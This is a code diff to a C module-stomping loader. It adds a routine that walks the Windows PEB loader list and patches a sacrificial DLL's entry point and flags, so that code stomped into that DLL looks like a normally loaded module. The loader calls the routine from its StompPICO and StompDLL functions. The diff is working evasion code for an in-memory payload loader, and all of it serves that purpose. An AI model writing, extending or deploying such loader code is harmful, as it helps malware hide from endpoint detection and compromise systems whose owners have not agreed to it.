@@ -1,5 +1,11 @@
 #include "stomp.h"
 
+static PSP_PEB _sp_get_peb(void) {
+    PSP_PEB peb;
+    __asm__ volatile ("movq %%gs:0x60, %0" : "=r" (peb));
+    return peb;
+}
+
 #if defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 1
 
 static SIZE_T _sp_wstrlen(const WCHAR* s) {
@@ -84,12 +90,6 @@ static BOOL _sp_map_image(const char* dllName, PVOID* pViewBase, SIZE_T* pViewSi
     *pViewBase = viewBase;
     *pViewSize = viewSize;
     return TRUE;
-}
-
-static PSP_PEB _sp_get_peb(void) {
-    PSP_PEB peb;
-    __asm__ volatile ("movq %%gs:0x60, %0" : "=r" (peb));
-    return peb;
 }
 
 static VOID _sp_insert_fake_ldr_entry(PVOID viewBase, const char* dllName)
@@ -325,6 +325,38 @@ static BOOL StompDLLNtSection( DLL_ARGS dllArgs ) {
 
 #endif /* STOMP_TECHNIQUE == 1 */
 
+static void _sp_patch_ldr_entry(PVOID moduleBase) {
+    PSP_PEB pPeb = _sp_get_peb();
+    if (!pPeb || !pPeb->Ldr) return;
+
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)moduleBase + dos->e_lfanew);
+
+    PSP_PEB_LDR_DATA pLdr = pPeb->Ldr;
+    PSP_LIST_ENTRY head    = &pLdr->InLoadOrderModuleList;
+    PSP_LIST_ENTRY cur     = head->Flink;
+
+    while (cur != head) {
+        PSP_LDR_DATA_TABLE_ENTRY entry =
+            (PSP_LDR_DATA_TABLE_ENTRY)cur;
+
+        if (entry->DllBase == moduleBase) {
+            /* Restore EntryPoint from the PE header */
+            entry->EntryPoint = (PVOID)((ULONG_PTR)moduleBase +
+                                        nt->OptionalHeader.AddressOfEntryPoint);
+
+            /* Set LDRP_IMAGE_DLL | LDRP_ENTRY_PROCESSED */
+            entry->Flags |= SP_LDRP_IMAGE_DLL | SP_LDRP_ENTRY_PROCESSED;
+
+            StealthDbg("_sp_patch_ldr_entry: patched DllBase=%p EntryPoint=%p Flags=0x%X\n",
+                       moduleBase, entry->EntryPoint, entry->Flags);
+            return;
+        }
+        cur = cur->Flink;
+    }
+    StealthDbg("WARN: _sp_patch_ldr_entry: module %p not found in InLoadOrderModuleList\n", moduleBase);
+}
+
 static BOOL StompPICO( PICO_ARGS picoArgs ) {
 #if defined(STOMP_TECHNIQUE) && STOMP_TECHNIQUE == 1
     StealthDbg("StompPICO: using NtCreateSection + NtMapViewOfSection technique\n");
@@ -339,6 +371,8 @@ static BOOL StompPICO( PICO_ARGS picoArgs ) {
         return FALSE;
     }
     StealthDbg("loaded sacrificial DLL '%s' at %p\n", picoArgs.sacrificialDll, hModule);
+
+    _sp_patch_ldr_entry((PVOID)hModule);
 
     PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)hModule;
     PIMAGE_NT_HEADERS   pNtHeader  = (PIMAGE_NT_HEADERS)((ULONG_PTR)hModule + pDosHeader->e_lfanew);
@@ -403,6 +437,9 @@ static BOOL StompDLL( DLL_ARGS dllArgs ) {
         StealthDbg("ERROR: failed to load sacrificial DLL '%s'\n", dllArgs.sacrificialDll);
         return FALSE;
     }
+
+    _sp_patch_ldr_entry((PVOID)*(dllArgs.dll_dst));
+
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)*(dllArgs.dll_dst);
     PIMAGE_NT_HEADERS pNtHeader  = (PIMAGE_NT_HEADERS)((ULONG_PTR)*(dllArgs.dll_dst) + pDosHeader->e_lfanew);
     DWORD dllSize = pNtHeader->OptionalHeader.SizeOfImage;
